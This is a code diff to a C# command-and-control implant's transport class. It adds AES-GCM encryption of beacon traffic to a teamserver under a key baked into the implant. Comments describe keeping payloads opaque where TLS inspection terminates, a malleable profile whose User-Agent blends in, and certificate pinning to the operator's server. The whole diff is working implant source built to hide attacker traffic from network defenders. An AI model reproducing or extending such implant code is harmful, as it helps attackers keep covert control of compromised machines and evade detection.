@@ -181,13 +181,26 @@ internal static class C2
             : TransportProfile.DefaultRequestTimeout;
         using var http = new HttpClient(handler) { Timeout = timeout };
 
-        // Serialize the body once so the envelope can reshape it: base64 wraps the
-        // JSON as a single string, raw sends the JSON document (the shape
-        // PostAsJsonAsync would have produced).
+        // Serialize the body once so the envelope can reshape it: AES-GCM
+        // encrypts it under the baked key (the body stays opaque even where
+        // TLS terminates early), base64 wraps it as a single string, raw
+        // sends the JSON document. The wire layout is the teamserver's
+        // contract: b"R1" || keyId(16) || nonce(12) || ciphertext || tag(16),
+        // base64 in a JSON string.
         var json = System.Text.Json.JsonSerializer.Serialize(body);
-        var payload = profile.IsBase64Envelope
-            ? ("\"" + Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(json)) + "\"")
-            : json;
+        string payload;
+        if (profile.IsAesGcmEnvelope)
+        {
+            payload = "\"" + AesGcmEnvelope(json, profile.EnvelopeKey) + "\"";
+        }
+        else if (profile.IsBase64Envelope)
+        {
+            payload = "\"" + Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(json)) + "\"";
+        }
+        else
+        {
+            payload = json;
+        }
         var content = new StringContent(payload, System.Text.Encoding.UTF8, "application/json");
 
         // Apply the malleable profile (architecture.md Sec 7): User-Agent blends
@@ -255,6 +268,42 @@ internal static class C2
     /// malformed response): retrying would not change the answer.
     /// </summary>
     internal sealed class EnrollRejectedException(string message) : Exception(message);
+
+    /// <summary>
+    /// The AES-GCM envelope's client half: packs the plaintext as
+    /// <c>b"R1" || keyId(16) || nonce(12) || ciphertext || tag(16)</c> and
+    /// base64s it -- the exact shape the teamserver's enroll decode unwraps.
+    /// The baked key string is standard base64 of keyId(16) || key(32).
+    /// </summary>
+    private static string AesGcmEnvelope(string plaintextJson, string bakedKey)
+    {
+        var packed = Convert.FromBase64String(bakedKey);
+        if (packed.Length != 16 + 32)
+            throw new InvalidOperationException("baked envelope key is malformed");
+        var keyId = packed[..16];
+        var key = packed[16..];
+        var plaintext = System.Text.Encoding.UTF8.GetBytes(plaintextJson);
+        var nonce = RandomNumberGenerator.GetBytes(12);
+        var ciphertext = new byte[plaintext.Length];
+        var tag = new byte[16];
+        using (var aes = new AesGcm(key, 16))
+        {
+            aes.Encrypt(nonce, plaintext, ciphertext, tag, "rod-envelope-v1"u8);
+        }
+
+        var body = new byte[2 + 16 + 12 + ciphertext.Length + 16];
+        var position = 0;
+        "R1"u8.CopyTo(body.AsSpan(position));
+        position += 2;
+        keyId.AsSpan().CopyTo(body.AsSpan(position));
+        position += 16;
+        nonce.AsSpan().CopyTo(body.AsSpan(position));
+        position += 12;
+        ciphertext.AsSpan().CopyTo(body.AsSpan(position));
+        position += ciphertext.Length;
+        tag.AsSpan().CopyTo(body.AsSpan(position));
+        return Convert.ToBase64String(body);
+    }
 
     // Accepts the peer certificate iff it chains to one of the pinned CAs. The
     // dev teamserver presents a CA-issued listener leaf as its server identity
